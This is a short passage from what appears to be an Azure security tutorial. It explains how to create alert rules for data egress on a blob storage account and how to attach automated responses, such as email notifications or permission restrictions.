To help proactively manage blob storage security, create alert rules based on events such as data egress. Click on the storage account, then click `Alerts` and `Create alert rule` under the `Monitoring` section

![](abuse-dynamic-groups-in-entra-id-for-privilege-escalation-8.png)

Define the conditions, then we can specify the actions that should be taken. For example, we might have an Azure function app that sends us an email notifying about unusual data egress activity, or it could restrict permissions to prevent further access.

![](abuse-dynamic-groups-in-entra-id-for-privilege-escalation-9.png)

